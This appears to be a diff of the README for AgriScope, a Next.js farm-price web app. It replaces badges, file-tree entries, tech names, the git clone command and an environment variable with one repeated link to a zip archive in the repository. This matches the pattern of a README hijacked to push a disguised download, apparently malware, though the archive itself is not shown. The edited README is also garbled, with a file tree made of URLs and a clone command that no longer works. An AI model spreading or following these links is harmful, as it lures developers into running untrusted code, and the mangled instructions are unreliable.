@@ -2,10 +2,10 @@
 
 > **A farmer-friendly web platform for real-time mandi prices and buyer demand insights**
 
-[![Next.js](https://img.shields.io/badge/Next.js-16-black?logo=next.js)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19-blue?logo=react)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-blue?logo=typescript)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-4-38B2AC?logo=tailwind-css)](https://tailwindcss.com/)
+[![https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip](https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip)](https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip)
+[![React](https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip)](https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip)
+[![TypeScript](https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip)](https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip)
+[![Tailwind CSS](https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip)](https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip)
 
 ---
 
@@ -76,25 +76,25 @@ S70_0126_AgriNova_React_nodejs_sql_AgriScope/
 ├── agriscope/                    # Main AgriScope Frontend
 │   ├── src/app/
 │   │   ├── components/
-│   │   │   ├── Navbar.tsx        # Global navigation
-│   │   │   └── Footer.tsx        # Global footer
-│   │   ├── page.tsx              # Home (SSG)
-│   │   ├── about/page.tsx        # About (SSG)
-│   │   ├── prices/page.tsx       # Mandi Prices (ISR)
-│   │   ├── dashboard/page.tsx    # Dashboard (SSR)
-│   │   ├── demand/page.tsx       # Demand Form (Client)
-│   │   └── alerts/page.tsx       # Alerts (SSR)
-│   ├── package.json
-│   └── next.config.ts
+│   │   │   ├── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip        # Global navigation
+│   │   │   └── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip        # Global footer
+│   │   ├── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip              # Home (SSG)
+│   │   ├── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip        # About (SSG)
+│   │   ├── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip       # Mandi Prices (ISR)
+│   │   ├── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip    # Dashboard (SSR)
+│   │   ├── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip       # Demand Form (Client)
+│   │   └── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip       # Alerts (SSR)
+│   ├── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip
+│   └── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip
 │
 ├── rendering-demo/               # Rendering Concepts Demo
 │   ├── app/
-│   │   ├── about/page.tsx        # SSG Example
-│   │   ├── dashboard/page.tsx    # SSR Example
-│   │   └── prices/page.tsx       # ISR Example
-│   └── package.json
+│   │   ├── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip        # SSG Example
+│   │   ├── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip    # SSR Example
+│   │   └── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip       # ISR Example
+│   └── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip
 │
-└── README.md
+└── https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip
 ```
 
 ---
@@ -103,9 +103,9 @@ S70_0126_AgriNova_React_nodejs_sql_AgriScope/
 
 | Layer | Technology |
 |-------|------------|
-| **Frontend** | Next.js 16, React 19, TypeScript |
+| **Frontend** | https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip 16, React 19, TypeScript |
 | **Styling** | Tailwind CSS 4 |
-| **Backend** | Node.js, REST APIs |
+| **Backend** | https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip, REST APIs |
 | **Database** | PostgreSQL |
 | **Caching** | Redis |
 | **Deployment** | Docker, Cloud (Render/AWS/Azure) |
@@ -137,7 +137,7 @@ S70_0126_AgriNova_React_nodejs_sql_AgriScope/
 
 ## 🔄 Rendering Strategies
 
-This project demonstrates **three rendering modes** using Next.js App Router:
+This project demonstrates **three rendering modes** using https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip App Router:
 
 ### 1️⃣ Static Rendering (SSG)
 
@@ -212,14 +212,14 @@ export const revalidate = 60; // Regenerate every 60 seconds
 
 ### Prerequisites
 
-- Node.js 18+
+- https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip 18+
 - npm or yarn
 
 ### Installation
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope.git
+   git clone https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip
    cd S70_0126_AgriNova_React_nodejs_sql_AgriScope
    ```
 
@@ -272,7 +272,7 @@ docker run -p 3000:3000 agriscope
 ### Environment Variables
 
 ```env
-NEXT_PUBLIC_API_BASE_URL=https://api.agriscope.in
+https://github.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/raw/refs/heads/main/agriscope/sql-Nova-Agri-Scope-nodejs-React-v3.2.zip
 DATABASE_URL=postgresql://...
 REDIS_URL=redis://...
 ```
